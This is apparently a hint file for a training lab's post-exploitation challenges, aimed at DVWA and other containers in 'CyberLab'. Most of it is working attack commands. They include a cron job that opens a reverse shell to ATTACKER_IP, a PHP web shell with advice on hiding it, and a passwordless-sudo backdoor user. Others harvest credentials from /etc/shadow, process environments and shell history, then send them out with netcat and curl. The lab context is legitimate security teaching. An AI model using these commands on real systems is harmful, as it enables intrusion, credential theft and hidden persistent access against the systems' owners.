# Post-Exploitation Hints

Progressive hints to help you through post-exploitation challenges.

---

## General Hints

### Hint 1: Always Enumerate First

Before any action, understand your position:
```bash
whoami && id && hostname
ip addr
ps aux
```

### Hint 2: Document Everything

Keep track of:
- Credentials found
- Systems accessed
- Persistence mechanisms installed
- Network paths discovered

### Hint 3: Stealth Matters

In real engagements:
- Minimize noise
- Use native tools when possible
- Clean up artifacts
- Avoid detection

---

## Situational Awareness Hints

### System Information

<details>
<summary>Hint 1: Basic identity commands</summary>

```bash
# Who am I?
whoami
id
hostname

# What system?
uname -a
cat /etc/*release*
```
</details>

<details>
<summary>Hint 2: Am I in a container?</summary>

```bash
# Check for container indicators
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# If you see "docker" in cgroup, you're in a container
```
</details>

<details>
<summary>Hint 3: Network discovery</summary>

```bash
# Your IP and routes
ip addr
ip route

# DNS and hosts
cat /etc/resolv.conf
cat /etc/hosts

# Active connections
ss -tulpn
netstat -an
```
</details>

### User Enumeration

<details>
<summary>Hint 1: Finding other users</summary>

```bash
# Users with shells
cat /etc/passwd | grep -v nologin | grep -v false

# Home directories
ls -la /home/

# Current logins
w
who
```
</details>

<details>
<summary>Hint 2: Check your privileges</summary>

```bash
# Can you sudo?
sudo -l

# What groups?
groups

# SUID files you can use
find / -perm -4000 2>/dev/null
```
</details>

---

## Persistence Hints

### SSH Key Persistence

<details>
<summary>Hint 1: SSH key basics</summary>

On attacker machine:
```bash
ssh-keygen -t rsa -b 4096 -f backdoor_key -N ""
cat backdoor_key.pub
```

Copy the public key to target's authorized_keys.
</details>

<details>
<summary>Hint 2: Installing the key</summary>

On target:
```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
</details>

<details>
<summary>Hint 3: Testing access</summary>

From attacker:
```bash
ssh -i backdoor_key user@target
```

If it works, you have passwordless access!
</details>

### Cron Persistence

<details>
<summary>Hint 1: Basic cron syntax</summary>

```
* * * * * command
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)

*/5 = every 5 minutes
```
</details>

<details>
<summary>Hint 2: Adding a cron job</summary>

```bash
# Add without interactive editor
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1") | crontab -

# Verify
crontab -l
```
</details>

<details>
<summary>Hint 3: Cron not working?</summary>

Common issues:
- Path issues (use full paths: /bin/bash not bash)
- Permissions on script
- Cron service not running
- Special characters need escaping

```bash
# Check cron is running
systemctl status cron
# or
service cron status
```
</details>

### Backdoor User

<details>
<summary>Hint 1: Creating a user</summary>

```bash
# Create user with bash shell
useradd -m -s /bin/bash backdoor

# Set password
echo "backdoor:password" | chpasswd
```
</details>

<details>
<summary>Hint 2: Giving admin rights</summary>

```bash
# Add to sudo group
usermod -aG sudo backdoor

# Or direct sudoers entry
echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```
</details>

<details>
<summary>Hint 3: Making it stealthy</summary>

Use realistic names:
- sysadmin, backup, maintenance
- Match naming conventions on system
- Use UID in normal range (1000+)
</details>

### Web Shell Persistence

<details>
<summary>Hint 1: Simple PHP web shell</summary>

```php
<?php if(isset($_GET['c'])){system($_GET['c']);}?>
```

Save as `.system.php` in web root.
</details>

<details>
<summary>Hint 2: Hiding the web shell</summary>

```bash
# Use hidden filename
.system.php
.config.php

# Put in less obvious location
/var/www/html/includes/
/var/www/html/assets/

# Match existing file names
system_check.php
config_backup.php
```
</details>

<details>
<summary>Hint 3: Using the web shell</summary>

```bash
curl "http://target/.system.php?c=id"
curl "http://target/.system.php?c=cat+/etc/passwd"

# URL encode special characters
curl "http://target/.system.php?c=cat%20/etc/shadow"
```
</details>

---

## Credential Harvesting Hints

### Configuration Files

<details>
<summary>Hint 1: Where to look</summary>

```bash
# Web applications
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/includes/config.inc.php

# Databases
/etc/mysql/my.cnf
~/.my.cnf

# General configs
find / -name "*.conf" -type f 2>/dev/null | head -30
```
</details>

<details>
<summary>Hint 2: What to grep for</summary>

```bash
# Search for password strings
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "passwd" /etc/*.conf 2>/dev/null
grep -ri "db_pass" /var/www/ 2>/dev/null
```
</details>

<details>
<summary>Hint 3: DVWA credentials location</summary>

```bash
cat /var/www/html/config/config.inc.php

# Look for:
# $_DVWA['db_user'] = 'dvwa';
# $_DVWA['db_password'] = 'p@ssw0rd';
```
</details>

### History Files

<details>
<summary>Hint 1: Bash history locations</summary>

```bash
# Current user
~/.bash_history

# All users (need permissions)
/home/*/.bash_history
/root/.bash_history
```
</details>

<details>
<summary>Hint 2: Finding passwords in history</summary>

```bash
grep -i "password\|pass=\|mysql\|ssh" ~/.bash_history
grep -i "curl.*-u\|wget.*--password" ~/.bash_history
```

People often type passwords in commands!
</details>

### Environment Variables

<details>
<summary>Hint 1: Current environment</summary>

```bash
env | grep -i "pass\|key\|secret\|token"
printenv | grep -i password
```
</details>

<details>
<summary>Hint 2: All processes' environment</summary>

```bash
# Requires root or same user
for pid in $(ls /proc | grep -E '^[0-9]+$'); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
done
```
</details>

### SSH Keys

<details>
<summary>Hint 1: Finding SSH keys</summary>

```bash
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" 2>/dev/null
ls -la /home/*/.ssh/
ls -la /root/.ssh/
```
</details>

<details>
<summary>Hint 2: Using stolen keys</summary>

```bash
# Copy the private key
cat /home/user/.ssh/id_rsa

# On attacker, save and set permissions
chmod 600 stolen_key
ssh -i stolen_key user@other_host
```
</details>

---

## Lateral Movement Hints

### Network Discovery

<details>
<summary>Hint 1: Quick ping sweep</summary>

```bash
# CyberLab network
for i in $(seq 1 20); do
    ping -c 1 -W 1 172.20.1.$i 2>/dev/null | grep "64 bytes" && echo "172.20.1.$i up"
done
```
</details>

<details>
<summary>Hint 2: Using nmap from container</summary>

```bash
# Install nmap if possible
apt update && apt install -y nmap

# Quick scan
nmap -sn 172.20.1.0/24

# Service scan
nmap -sV 172.20.1.10-20
```
</details>

<details>
<summary>Hint 3: CyberLab network layout</summary>

```
172.20.1.x  - Web Applications
172.20.2.x  - Databases
172.20.3.x  - Services (FTP, etc)
172.20.4.x  - Custom vulnerable services
```
</details>

### Service Access

<details>
<summary>Hint 1: Database connections</summary>

```bash
# MySQL
mysql -h 172.20.2.10 -u root -p'root'

# PostgreSQL
psql -h 172.20.2.11 -U postgres

# Redis (often no auth)
redis-cli -h 172.20.2.12
```
</details>

<details>
<summary>Hint 2: Using found credentials</summary>

Try credentials on ALL services:
- Same user/pass on SSH
- Database credentials on other DBs
- Admin passwords on web apps
</details>

---

## Pivoting Hints

### SSH Tunneling

<details>
<summary>Hint 1: Local port forward</summary>

Access internal service through SSH:
```bash
# Forward local:8080 to internal:80 via pivot
ssh -L 8080:internal_host:80 user@pivot

# Now access internal service at localhost:8080
curl http://localhost:8080
```
</details>

<details>
<summary>Hint 2: SOCKS proxy</summary>

```bash
# Create SOCKS proxy through pivot
ssh -D 9050 user@pivot

# Use with proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT internal_target
```
</details>

### Chisel Tunneling

<details>
<summary>Hint 1: Setting up Chisel</summary>

On attacker (server):
```bash
./chisel server -p 8080 --reverse
```

On pivot (client):
```bash
./chisel client ATTACKER_IP:8080 R:9050:socks
```
</details>

<details>
<summary>Hint 2: Using the tunnel</summary>

```bash
# SOCKS proxy now on attacker at 9050
proxychains curl http://internal_ip
proxychains nmap -sT internal_network
```
</details>

<details>
<summary>Hint 3: Transferring Chisel</summary>

```bash
# On attacker, serve chisel
python3 -m http.server 8000

# On pivot, download
wget http://ATTACKER_IP:8000/chisel
chmod +x chisel
```
</details>

---

## Data Exfiltration Hints

### Basic Transfer

<details>
<summary>Hint 1: Using netcat</summary>

Attacker (receive):
```bash
nc -lvnp 4444 > received_file.txt
```

Target (send):
```bash
nc ATTACKER_IP 4444 < /etc/shadow
```
</details>

<details>
<summary>Hint 2: Base64 encoding</summary>

On target:
```bash
cat /etc/shadow | base64
```

Copy output, then on attacker:
```bash
echo "BASE64_STRING" | base64 -d > shadow.txt
```
</details>

<details>
<summary>Hint 3: HTTP POST</summary>

On attacker:
```bash
nc -lvnp 8888
```

On target:
```bash
curl -X POST -d "$(cat /etc/shadow | base64)" http://ATTACKER_IP:8888/
```
</details>

### Creating Archives

<details>
<summary>Hint 1: Compress before transfer</summary>

```bash
# Create archive
tar czf /tmp/loot.tar.gz /etc/shadow /etc/passwd /var/www/html/config*

# Transfer
nc ATTACKER_IP 4444 < /tmp/loot.tar.gz
```
</details>

<details>
<summary>Hint 2: Extract on attacker</summary>

```bash
# Receive
nc -lvnp 4444 > loot.tar.gz

# Extract
tar xzf loot.tar.gz
```
</details>

---

## CyberLab Specific Hints

### Container Access

<details>
<summary>Hint 1: Get shell in container</summary>

```bash
# From host
docker exec -it lab-dvwa bash

# List all containers
docker ps
```
</details>

<details>
<summary>Hint 2: Container network</summary>

```bash
# Check your IP in container
ip addr

# Container IPs start with 172.20.x.x
```
</details>

### Database Credentials

<details>
<summary>Hint 1: DVWA database</summary>

```
MySQL Host: lab-mysql (or 172.20.2.10)
Database: dvwa
Username: dvwa
Password: p@ssw0rd
```
</details>

<details>
<summary>Hint 2: Testing database access</summary>

```bash
# From DVWA container
mysql -h lab-mysql -u dvwa -p'p@ssw0rd' dvwa

# Dump users table
mysql -h lab-mysql -u dvwa -p'p@ssw0rd' dvwa -e "SELECT * FROM users;"
```
</details>

### SSH Access

<details>
<summary>Hint 1: Vulnerable SSH</summary>

```
Host: localhost (port 2222 from host)
User: labuser
Password: labpass123
```
</details>

<details>
<summary>Hint 2: Pivot from SSH</summary>

Once you have SSH:
```bash
# Check what networks are reachable
ip route
ping 172.20.1.10

# Set up tunnel
ssh -D 9050 labuser@localhost -p 2222
```
</details>

---

## Troubleshooting

### Persistence Not Working

<details>
<summary>Cron job not executing</summary>

- Check cron service is running
- Use absolute paths
- Check permissions on script
- Look at cron logs: `/var/log/cron`
</details>

<details>
<summary>SSH key rejected</summary>

- Check permissions: `.ssh` = 700, `authorized_keys` = 600
- Verify key format is correct
- Check SSH config allows key auth
</details>

### Connection Issues

<details>
<summary>Can't reach internal network</summary>

- Verify routing (`ip route`)
- Check firewall rules
- Try different ports
- Confirm target is actually up
</details>

<details>
<summary>Tunnel not working</summary>

- Check server is listening
- Verify correct IP/port
- Test with simple commands first
- Check for port conflicts
</details>

---

## Quick Reference

### Persistence Methods

| Method | Trigger | Stealth |
|--------|---------|---------|
| SSH Keys | SSH login | High |
| Cron | Time-based | Medium |
| Bashrc | User login | Medium |
| Web Shell | HTTP request | Variable |
| User Account | Login | Low |

### Common Credential Locations

| Type | Location |
|------|----------|
| Shadow | `/etc/shadow` |
| SSH Keys | `~/.ssh/id_rsa` |
| History | `~/.bash_history` |
| Web Config | `/var/www/html/config.php` |
| Environment | `env`, `/proc/*/environ` |

### CyberLab IPs

| Service | IP/Port |
|---------|---------|
| DVWA | 172.20.1.10:80 |
| Juice Shop | 172.20.1.11:3000 |
| MySQL | 172.20.2.10:3306 |
| Redis | 172.20.2.12:6379 |
| Vulnerable SSH | localhost:2222 |

---

**Back to:** [README](./README.md) | [Walkthrough](./walkthrough.md)
